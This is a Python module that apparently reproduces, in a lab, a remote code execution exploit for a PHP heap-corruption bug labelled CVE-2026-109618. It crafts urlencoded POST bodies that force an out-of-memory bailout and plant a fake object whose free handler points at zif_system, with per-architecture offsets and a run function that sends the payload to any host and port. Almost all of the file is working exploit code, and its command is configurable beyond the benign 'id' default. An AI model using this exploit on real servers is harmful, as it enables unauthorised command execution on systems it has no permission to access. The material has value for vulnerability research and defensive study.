"""CVE-2026-109618 OOM-corruption chain — lab reproduction (arm64/amd64).

Mechanism (public cookiengineer / advisory lineage):

  `a[<large-key>][c]=v` urlencoded fields make `php_register_variable_ex()`
  add the large intermediate key via `_zend_hash_str_add_or_update_i()`,
  whose `add_to_hash` bumps `nNumUsed` and *then* allocates the key copy.
  An OOM (`zend_bailout`) at that allocation leaves `$_POST["a"]` with one
  unwritten bucket. At shutdown `zend_array_destroy()` walks it; if the
  bucket `val` is `IS_OBJECT` pointing at a fake object, the object
  destructor calls `handlers->free_obj(object)`.

This module replaces the public chain's libc ROP (`jump_fcontext` pivot +
`system`) with the repo's rung-5b trick: set `free_obj = zif_system` and
lay the fake object out so it doubles as a `zend_execute_data` with one
string argument. That removes libc entirely — only libphp and the ZendMM
chunk base are needed.

The caller supplies `libphp`/`chunk` (lab-assisted, e.g. from /proc). The
in-band sourcing of those is the remaining integration step; see
`docs/ANALYSIS.md` §0.11.

Lab-only: fixed benign command only.
"""

from __future__ import annotations

import struct

from . import probe

ZIF_SYSTEM = {"x86_64": 0x465370, "aarch64": 0x42CD70}
ABI = {"x86_64": "amd64", "aarch64": "arm64"}


def build_pad(libphp, b, cmd, obj_off=2048, arch="aarch64", trigger=True, bucket=45):
    """Pad value (bin-28 block) carrying fake handlers/object/execute_data."""
    zif = libphp + ZIF_SYSTEM[arch]
    handlers = b + 24 + (obj_off - 48)
    obj = b + 24 + obj_off
    arg = obj + 0x80
    cmd_addr = obj + 0x98
    data = cmd.encode() + b"\x00"
    if len(data) > 0x160 - 0x98:
        raise ValueError("command too long for the 384-byte carrier")

    pad = bytearray(b"P" * 2528)
    # fake zend_object_handlers: free_obj @ +8, dtor_obj @ +16
    struct.pack_into("<Q", pad, obj_off - 48 + 0x00, 0)
    struct.pack_into("<Q", pad, obj_off - 48 + 0x08, zif)
    struct.pack_into("<Q", pad, obj_off - 48 + 0x10, zif)
    # fake zend_object (also zend_execute_data)
    o = obj_off
    struct.pack_into("<I", pad, o + 0x00, 1)          # gc.refcount
    struct.pack_into("<I", pad, o + 0x04, 8)          # IS_OBJECT
    struct.pack_into("<I", pad, o + 0x08, 0)          # handle
    struct.pack_into("<Q", pad, o + 0x10, 0)          # ce (unused by zif)
    struct.pack_into("<Q", pad, o + 0x18, handlers)   # handlers / EX(func)
    struct.pack_into("<Q", pad, o + 0x20, 0)          # properties
    struct.pack_into("<I", pad, o + 0x2C, 1)          # num_args = 1
    struct.pack_into("<Q", pad, o + 0x50, arg)        # arg1 zval.value
    struct.pack_into("<Q", pad, o + 0x58, 6)          # arg1 IS_STRING
    # fake zend_string at obj+0x80, data at obj+0x98
    struct.pack_into("<I", pad, o + 0x80, 1)
    struct.pack_into("<I", pad, o + 0x84, 0x106)
    struct.pack_into("<Q", pad, o + 0x88, 0)
    struct.pack_into("<Q", pad, o + 0x90, len(cmd))
    pad[o + 0x98:o + 0x98 + len(data)] = data
    # unwritten bucket val: IS_OBJECT -> fake object.
    # trigger=False writes IS_UNDEF so the shutdown walk skips it (diagnostic
    # run that measures the heap layout without crashing the worker).
    # The unwritten bucket is the last one (nUsed-1); the fake object must
    # live *beyond* nUsed so the walk does not treat it as a bucket. The
    # public layout uses bucket 45 (nUsed=46). Fill only that slot.
    vocab = 488 + bucket * 32   # pad offset of bucket[bucket].val
    if trigger:
        struct.pack_into("<Q", pad, vocab, obj)
        struct.pack_into("<I", pad, vocab + 8, 8 | 0x100)
        struct.pack_into("<I", pad, vocab + 12, 0)
    else:
        struct.pack_into("<Q", pad, vocab, 0)
        struct.pack_into("<Q", pad, vocab + 8, 0)
    return bytes(pad), zif


def build_body(libphp, chunk, cmd, b_off=0x5E400, memshift=40000,
               keys=60, obj_off=2048, arch="aarch64", trigger=True, bucket=45,
               key_salt=b""):
    b = chunk + b_off
    pad, zif = build_pad(libphp, b, cmd, obj_off=obj_off, arch=arch,
                         trigger=trigger, bucket=bucket)

    def key(i):
        pad = 80000 - 16
        base = b"X" * pad
        if key_salt:
            base = key_salt + b"X" * (pad - len(key_salt))
        return base + (b"%016d" % i)

    out = bytearray()
    out += b"memshift=" + b"M" * memshift + b"&"
    for i in range(keys // 2):
        out += b"a[" + key(i) + b"][c]=v&"
    out += b"pad=" + pad + b"&pad=x&"
    for i in range(keys // 2, keys):
        out += b"a[" + key(i) + b"][c]=v&"
    return bytes(out), zif


def send(host, port, body, path="/index.php", timeout=180):
    return probe.http_post(
        host, port, path, body,
        headers={"Content-Type": "application/x-www-form-urlencoded"},
        timeout=timeout, recv_timeout=timeout,
    )


def run(host, port, libphp, chunk, cmd="id", b_off=0x5E400, path="/index.php", arch="aarch64"):
    body, zif = build_body(libphp, chunk, cmd, b_off=b_off, arch=arch)
    resp = send(host, port, body, path=path)
    return {"zif": zif, "b": chunk + b_off, "status": probe.status(resp),
            "bytes": len(probe.body(resp))}
